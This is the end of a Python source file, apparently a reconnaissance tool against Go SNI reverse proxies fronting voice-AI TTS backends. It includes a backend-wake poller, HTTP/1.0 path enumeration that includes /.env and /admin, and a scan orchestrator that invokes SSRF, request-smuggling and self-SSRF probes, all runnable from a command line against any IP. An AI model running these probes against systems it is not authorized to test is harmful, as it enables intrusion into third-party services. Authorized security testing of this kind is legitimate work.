# ---------------------------------------------------------------------------
# 7. Backend wake watcher
# ---------------------------------------------------------------------------

def poll_backend_wake(ip: str, port: int = 443,
                       sni: str = "",
                       log_path: str = "",
                       once: bool = True,
                       interval_s: int = 60) -> str:
    """
    Poll the Go ReverseProxy until backend changes from 502.
    Returns status string: "502-DOWN" | "TIMEOUT" | "EMPTY" | "ALIVE:<data>"

    If once=False, loops until ALIVE detected (for cron-driven invocation).
    log_path: JSONL file to append status entries (optional).

    ALIVE triggers immediate openapi.json probe to characterize the surface.
    """
    if not sni:
        sni = ip

    def poll_once():
        t, d = _tcp_probe(ip, port, build_clienthello(sni), 8.0, 10.0)
        ms = int(t * 1000)
        if b"502" in d:
            return "502-DOWN", ms, d
        elif b"__TIMEOUT__" in d:
            return "TIMEOUT", ms, d
        elif len(d) == 0:
            return "EMPTY", ms, d
        elif b"__" in d:
            return f"ERR:{d[:40].decode('utf-8', errors='replace')}", ms, d
        else:
            return f"ALIVE:{d[:100].decode('utf-8', errors='replace')}", ms, d

    def log(entry):
        if not log_path:
            return
        try:
            with open(os.path.expanduser(log_path), "a") as f:
                f.write(json.dumps(entry) + "\n")
        except Exception:
            pass

    while True:
        status, ms, raw = poll_once()
        ts = datetime.datetime.utcnow().isoformat() + "Z"
        entry = {"ts": ts, "status": status, "ms": ms,
                 "raw": raw.decode("utf-8", errors="replace")[:200]}
        log(entry)

        if status.startswith("ALIVE"):
            # Immediate follow-up: probe openapi to confirm API surface
            api_payload = (build_clienthello(sni)
                           + b"GET /openapi.json HTTP/1.1\r\nHost: "
                           + ip.encode()
                           + b"\r\nConnection: close\r\n\r\n")
            _, api_d = _tcp_probe(ip, port, api_payload, 8.0, 10.0)
            entry["openapi_probe"] = api_d.decode("utf-8", errors="replace")[:400]
            log(entry)
            return status

        if once:
            return status

        time.sleep(interval_s)


# ---------------------------------------------------------------------------
# 8. Method enumeration on HTTP/1.0 catch-all
# ---------------------------------------------------------------------------

def enumerate_http10_methods(ip: str, port: int = 80,
                              timeout: float = 6.0) -> list:
    """
    Enumerate which HTTP methods the catch-all accepts and whether any path
    returns a non-empty body (would indicate a non-catch-all handler present).

    Paths tested include common FastAPI / uvicorn surfaces that may be exposed
    if the voice AI backend is also listening on :80.

    Returns findings:
      HTTP10_BODY_RESPONSE      CRITICAL — non-empty body on catch-all port (hidden API)
      HTTP10_NON200             HIGH     — specific path returns non-200 (route exists)
      HTTP10_UNIVERSAL_200      INFO     — confirmed universal 200 (pure stub)
    """
    findings = []

    paths = [
        ("/", "GET"),
        ("/openapi.json", "GET"),
        ("/docs", "GET"),
        ("/health", "GET"),
        ("/metrics", "GET"),
        ("/v1/audio/speech", "POST"),
        ("/tts", "POST"),
        ("/synthesize", "POST"),
        ("/api/v1/tts", "POST"),
        ("/.env", "GET"),
        ("/admin", "GET"),
    ]

    universal_200 = True
    for path, method in paths:
        resp = _http10_probe(ip, port, path, method, timeout)
        first_line = resp.split("\n")[0].strip() if resp else ""
        has_body = len(resp) > len(first_line) + 10 and "Content-Length: 0" not in resp
        is_200 = "200" in first_line

        if has_body:
            universal_200 = False
            findings.append(_finding(
                "CRITICAL", "HTTP10_BODY_RESPONSE",
                f"Non-empty body on HTTP/1.0 catch-all port :{port}. "
                f"Path: {method} {path}. First line: {first_line!r}. "
                f"Body: {resp[len(first_line)+2:len(first_line)+200]!r}. "
                f"Hidden API or backend leaking through catch-all.",
                ip, port))
        elif not is_200:
            universal_200 = False
            findings.append(_finding(
                "HIGH", "HTTP10_NON200",
                f"Non-200 response on path {method} {path}: {first_line!r}. "
                f"Route may be registered — not a pure catch-all.",
                ip, port))

    if universal_200:
        findings.append(_finding(
            "INFO", "HTTP10_UNIVERSAL_200",
            f"Confirmed universal HTTP/1.0 200 catch-all on :{port}. "
            f"All {len(paths)} tested paths/methods return 200 Content-Length:0. "
            f"Pure liveness stub — not the application API layer.",
            ip, port))

    return findings


# ---------------------------------------------------------------------------
# 9. Composite scan — full RE sweep on a Go SNI proxy target
# ---------------------------------------------------------------------------

def scan(ip: str, proxy_port: int = 443, health_port: int = 80,
         log_path: str = "") -> list:
    """
    Run all RE probes in sequence. Returns combined findings list.
    Each probe is independent; errors in one don't stop others.

    Designed for: Aliyun-hosted kyutai-pocket-tts / similar Go-proxy voice-AI stacks.
    """
    all_findings = []

    stages = [
        ("catch-all fingerprint",   lambda: fingerprint_go_catchall(ip, health_port)),
        ("reverse-proxy fingerprint", lambda: fingerprint_go_reverse_proxy(ip, proxy_port)),
        ("routing mode",             lambda: discriminate_routing_mode(ip, proxy_port)),
        ("SSRF protection",          lambda: probe_ssrf_protection(ip, proxy_port)),
        ("HTTP smuggling",           lambda: probe_http_smuggling(ip, proxy_port)),
        ("self-SSRF",                lambda: probe_self_ssrf(ip, proxy_port, health_port)),
        ("HTTP/1.0 method enum",     lambda: enumerate_http10_methods(ip, health_port)),
        ("backend wake poll",        lambda: [_finding(
                                         "INFO", "BACKEND_POLL",
                                         f"status={poll_backend_wake(ip, proxy_port, ip, log_path, once=True)}",
                                         ip, proxy_port)]),
    ]

    for stage_name, fn in stages:
        try:
            results = fn()
            all_findings.extend(results)
        except Exception as e:
            all_findings.append(_finding(
                "ERROR", f"STAGE_ERROR_{stage_name.upper().replace(' ', '_')}",
                f"Stage '{stage_name}' raised: {e}",
                ip, proxy_port))

    return all_findings


# ---------------------------------------------------------------------------
# CLI entrypoint
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import sys

    def _usage():
        print("Usage: go_sniproxy_re.py <ip> [proxy_port] [health_port] [mode]")
        print("  mode: scan | fingerprint | ssrf | smuggle | oracle | watch | methods | timing")
        sys.exit(1)

    if len(sys.argv) < 2:
        _usage()

    _ip = sys.argv[1]
    _pp = int(sys.argv[2]) if len(sys.argv) > 2 else 443
    _hp = int(sys.argv[3]) if len(sys.argv) > 3 else 80
    _mode = sys.argv[4] if len(sys.argv) > 4 else "scan"

    _dispatch = {
        "scan":        lambda: scan(_ip, _pp, _hp),
        "fingerprint": lambda: (fingerprint_go_catchall(_ip, _hp)
                                + fingerprint_go_reverse_proxy(_ip, _pp)),
        "ssrf":        lambda: probe_ssrf_protection(_ip, _pp),
        "smuggle":     lambda: probe_http_smuggling(_ip, _pp),
        "oracle":      lambda: [_finding("INFO", "TIMING_ORACLE",
                                         json.dumps(probe_internal_timing_oracle(_ip, _pp),
                                                    indent=2)[:800],
                                         _ip, _pp)],
        "watch":       lambda: [_finding("INFO", "WATCH",
                                         poll_backend_wake(_ip, _pp, _ip, once=False, interval_s=60),
                                         _ip, _pp)],
        "methods":     lambda: enumerate_http10_methods(_ip, _hp),
        "timing":      lambda: [_finding("INFO", "ROUTING",
                                         str(discriminate_routing_mode(_ip, _pp)),
                                         _ip, _pp)],
    }

    fn = _dispatch.get(_mode)
    if not fn:
        _usage()

    out = fn()
    for f in out:
        sev = f.get("severity", "?")
        title = f.get("title", "?")
        detail = f.get("detail", "")[:200]
        print(f"[{sev:8}] {title}")
        print(f"          {detail}")
        print()
